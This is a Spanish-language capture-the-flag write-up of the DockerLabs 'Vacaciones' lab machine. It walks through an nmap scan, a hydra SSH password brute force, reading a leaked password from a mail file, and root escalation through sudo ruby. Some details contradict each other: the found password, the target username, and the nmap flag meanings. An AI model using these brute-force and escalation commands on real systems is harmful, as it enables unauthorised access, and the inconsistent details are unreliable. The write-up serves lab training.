## WRITEUP DE LA MÁQUINA VACACIONES DE DOCKERLABS EN ESPAÑOL

Sitio web - https://dockerlabs.es/#/

Hacemos un escaneo de puertos mediante la herramienta nmap, esto casi siempre es el comienzo para la resolución de una máquina o CTF.

```shell
└─$ nmap -sV -sC 172.17.0.2 -oN outputscan.txt
```
"-sC" Muestra la versión del servicio del puerto abierto.
<br><br>
"-sV" Ejecuta scripts propios de Nmap que, entre otras cosas, descubren información detallada sobre los servicios.
<br><br>
"172.17.0.2" Es la dirección IP de la máquina víctima.
<br><br>
"-oN outputscan.txt" Sirve para que te copie el resultado del escaneo en el fichero que tú le indiques (no hay que crearlo antes, lo crea solo). Esto lo hago por si más tarde quiero volver a ver el escaneo pero no quiero tener que hacerlo de nuevo.

En este caso no he utlizado ni "-p-", ni "-n", ni "--min-rate 5000" ya que me tardaba mucho hacer el escaneo y para algo tan sencillo es más eficaz y rapido ejecutar un comando más corto.

```SHELL
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 03:01 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00017s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
```

Observamos que los puertos 22 y 80 de los servicios ssh, http respectivamente estan abiertos, vamos a tirar por observar la dirección IP en algún buscador ya que el servicio http esta abierto. Vemos la siguiente página:

![Página en blanco](paginablanco.png)

Con un simple ```Control + u``` inspeccionamos a fondo el código fuente de la página. Esto es lo que vemos:

![alt text](controlu.png)

Ahora conocemos dos nombres de usuario y que Camilo debe tener un archivo "correo" por algun lado. Empezaremos por hacer un ataque de fuerza bruta de contraseñas mediante hydra con la wordlist rockyou.txt.

(Como tenemos dos nombres pues habría que probar con los dos, pero os ahorro un tiempo diciendo que solo vamos a obtener la contraseña de Camilo)

```
└─$ hydra -l camilo -P /home/kali/Desktop/rockyou.txt ssh://172.17.0.2 -t 5
```

"-l camilo" Indica qué nombre de usuario va a usar en el ataque, en este caso buscamos a russoski.
<br><br>
"-P /home/kali/Desktop/rockyou.txt" Especifica la wordlist de contraseñas que va a usar para probar el ataque de fuerza bruta, cada uno pone la ruta donde se encuentre su fichero wordlist.
<br><br>
"ssh://172.17.0.2" Especifica el protocolo y la dirección del objetivo del ataque. En este caso, se está atacando el servicio SSH (Secure Shell) en la dirección IP 172.17.0.2
<br><br>
"-t 5" Especifica el número de tareas (threads) paralelas que Hydra debe usar durante el ataque. En este caso, -t 5 indica que Hydra debe utilizar 5 hilos de ejecución simultáneos para probar las combinaciones de nombre de usuario y contraseña. (Nos va a tomar un par de minutos)

Este es el resultado:

```shell
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-25 03:19:41
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://172.17.0.2:22/

[22][ssh] host: 172.17.0.2   login: camilo   password: password1

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-25 03:20:16
```

Encontramos en la línea apartada (la he separado yo para que sea más legible), que la contraseña es "iloveme". Ahora toca mediante conexion ssh entrar al usuario russoski.

Hay veces que se cierra la conexión con un WARNING: REMOTE  HOST IDENTIFICATION HAS CHANGED!, para solucionar solo hay que ejecutar el ssh con un sudo delante, si el problema persiste habra que borrar la clave de la contraseña que está en esta ruta ~/.sh/known_hosts , haciendo un "cat" y borrando la información del archivo ya podremos conectarnos sin problema:
<br>

```
└─$ sudo ssh camilo@172.17.0.2
```

Siendo el usuario camilo, vemos que ``` sudo -l ``` no se puede ejecutar porque no estamos en el grupo de "sudoers", pero es que tampoco nos sirve ``` find / -perm -4000 2>/dev/null ``` porque ningún binario nos es útil.

Es momento de aprovechar la información que sabemos de que camilo debe haber recibido un correo, buscando mediante ```find -name "correo" 2>/dev/null```

En cambio si busco lo mismo pero con la palabra "mail", así, ``` find / -name "mail" 2>/dev/null ``` encontramos dos directorios:

```
$ find / -name "mail" 2>/dev/null
/var/spool/mail
/var/mail
```

Mirando un poco en ambos, encontramos que tienen otro directorio llamado camilo y dentro de este un archivo llamado "correo.txt", un simple "cat" y nos muestra lo siguiente:

```
Hola camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Recordamos que Juan ha enviado este correo según estaba escrito en el codigo de la página web. Hacemos un ```su juan``` y ponemos la contraseña, somos juan:

```
$ whoami
juan
```
Probamos con un ``` sudo -l ``` y esta vez si que vamos a poder escalar privilegios, en este caso con el binario ruby. Vamos al sito web https://gtfobins.github.io/# y buscamos "ruby" en el apartado de "sudo", ```sudo ruby -e 'exec "/bin/sh"'```.

Ejecutamos y...

```
$ sudo ruby -e 'exec "/bin/sh"'
# whoami
root
```

Somos root, muchas por seguir este write up!!